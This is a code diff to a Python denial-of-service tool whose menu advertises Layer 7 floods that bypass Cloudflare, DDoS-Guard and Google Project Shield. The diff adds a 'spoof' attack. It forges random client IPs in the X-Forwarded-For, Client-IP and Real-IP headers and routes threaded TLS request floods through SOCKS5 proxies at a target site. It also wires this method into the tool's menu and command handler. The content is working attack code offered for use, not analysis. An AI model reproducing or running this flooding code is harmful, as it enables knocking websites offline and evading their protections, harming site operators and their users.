@@ -14,6 +14,7 @@ from requests.cookies import RequestsCookieJar
 import undetected_chromedriver as webdriver
 from sys import stdout
 from colorama import Fore, init
+from urllib.parse import urlparse
 init(convert=True)
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -215,7 +216,9 @@ def get_cookie(url):
     ]
     for argument in arguments:
         options.add_argument(argument)
-    driver = webdriver.Chrome(options=options)
+  #      options = webdriver.ChromeOptions('chromedriver.exe')
+    driver = webdriver.Chrome(options=options,executable_path='chromedriver.exe')
+ #   driver = webdriver.Chrome(ChromeDriverManager().install())
     driver.implicitly_wait(3)
     driver.get(url)
     for _ in range(60):
@@ -618,6 +621,7 @@ def AttackCFPRO(url, until_datetime, scraper):
 def LaunchCFSOC(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     target = get_target(url)
+#    cookie, user_agent = get_cookie(url)
     req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
     req += 'Host: ' + target['host'] + '\r\n'
     req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
@@ -737,7 +741,57 @@ def Launchhttp2(url, timer):
                             r5 = client.head(url)
                 except httpx.HTTPError as exc:
                    pass
-#region testzone
+#spoof
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
+    return assemebled
+
+#spoofmethod
+
+def attackspoof(url, timer, threads):
+    for i in range(int(threads)):
+        threading.Thread(target=Launchspoof, args=(url, timer)).start()
+
+def Launchspoof(url, timer):
+    socksCrawler()  
+    prox = open("./socks5.txt", 'r').read().split('\n')
+    proxy = random.choice(prox).strip().split(":")
+    timelol = time.time() + int(timer)
+    m = random.choice(method)
+    user_agent = random.choice(useragents)
+    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req += user_agent +"\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "X-Forwarded-Proto: Http\r\n"
+    req += "X-Forwarded-Host: "+urlparse(url).netloc+", 1.1.1.1\r\n"
+    req += "Via: "+spoofer()+"\r\n"
+    req += "Client-IP: "+spoofer()+"\r\n"
+    req += "X-Forwarded-For: "+spoofer()+"\r\n"
+    req += "Real-IP: "+spoofer()+"\r\n"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    while time.time() < timelol:
+        try:
+            s = socks.socksocket()
+            s.connect((str(urlparse(url).netloc), int(443)))
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            ctx = ssl.SSLContext()
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
+            try:
+                for i in range(200):
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            s.close()
+#sky
 def attackSKY(url, timer, threads):
     for i in range(int(threads)):
         threading.Thread(target=LaunchSKY, args=(url, timer)).start()
@@ -913,6 +967,7 @@ def layer7():
     stdout.write("                   "+Fore.LIGHTGREEN_EX   +"╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝                   \n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"        ══╦═════════════════════════════════╦══\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"╔═════════╩═════════════════════════════════╩══════════╗\n")
+    stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"spoof "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" STRONG Bypass with spoof Xforward         "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfb   "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF Attack                          "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxcfb "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF Attack With Proxy               "+Fore.LIGHTGREEN_EX+"║\n")                  
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfpro "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (request)     "+Fore.LIGHTGREEN_EX+"║\n")
@@ -920,7 +975,6 @@ def layer7():
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"bypass"+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass Google Project Shield, Vshield,    "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"sky   "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" DDoS Guard Free, CF NoSec                 "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"stellar"+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" HTTPS Sky method without proxies          "+Fore.LIGHTGREEN_EX+"║\n")
-    
     
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"get   "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Get Request Attack                        "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write("             "+Fore.LIGHTGREEN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"post  "+Fore.LIGHTGREEN_EX+" |"+Fore.LIGHTWHITE_EX+" Post Request Attack                       "+Fore.LIGHTGREEN_EX+"║\n")
@@ -1086,6 +1140,12 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
+    elif command == "spoof":
+        target, thread, t = get_info_l7()
+        threading.Thread(target=attackspoof, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
     elif command == "bypass":
         target, thread, t = get_info_l7()
         threading.Thread(target=attackbypass, args=(target, t, thread)).start()
@@ -1168,6 +1228,7 @@ def command():
 
 def func():
     stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.RED+"]\n")
+    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"spoof        "+Fore.RED+": "+Fore.WHITE+"spoof X-forward attack with socks5\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxcfb      "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack with proxy\n")
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
